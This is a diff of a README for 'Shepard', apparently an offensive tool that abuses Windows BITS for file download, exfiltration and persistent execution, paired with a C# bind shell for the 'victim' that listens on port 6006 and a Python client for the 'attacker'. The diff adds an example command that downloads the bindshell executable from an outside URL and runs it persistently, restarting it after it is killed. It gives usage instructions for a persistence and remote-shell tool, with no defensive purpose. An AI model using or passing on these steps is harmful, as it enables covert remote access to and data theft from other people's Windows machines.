@@ -2,11 +2,15 @@
 
 ## BITS
 
-This is an IN PROGRESS persistance tool using Windows Background Intelligent Transfer Service (BITS). 
+This is a persistance tool using Windows Background Intelligent Transfer Service (BITS). 
 
-Functionality: File Download, File Exfiltration, File Download + Persistent Execution
+### Functionality
 
-Usage: run shepard.exe as Administrator with the following command line arguments:
+File Download, File Exfiltration, File Download + Persistent Execution
+
+### Usage 
+
+Run shepard.exe as Administrator with the following command line arguments:
   
   `-d <remoteLocation> <writePath>` : regular file download to a local path of your choice
   
@@ -20,11 +24,15 @@ Running this executable with no arguments or an incorrect amount of arguments wi
 
 The server (victim) is written using C#. It listens on port 6006.
 
-Usage: run shepardsbind_serv.exe with no arguments.
+### Victim Usage 
+
+Run shepardsbind_serv.exe with no arguments.
 
 The client (attacker) is written using Python and takes one argument: the IP address of the victim's machine. 
 
-Usage: `shepardsbind_recv.py <victim's IP>`
+### Server Usage
+
+`shepardsbind_recv.py <victim's IP>`
 
 Running shepardsbind_recv.py with no arguments will return an error.
 
@@ -32,4 +40,5 @@ Running shepardsbind_recv.py with no arguments will return an error.
 
 The only executable that must be on the victim's machine is shepard.exe. Host the download bindshell executable to a publicly accessible place. 
 Shepard will download and run the bindshell executable, and the user can now use the python reciever. If the shell is found and killed, it will restart after 30 seconds.
-Last steps in progress: finding out how to rerun shepard.exe to redownload in case the shell executable is deleted. Most likely will use a service
+
+Example: `shepard.exe -dr http://location.com/shepardsbind_serv.exe C:\Users\Administrator\file.exe`
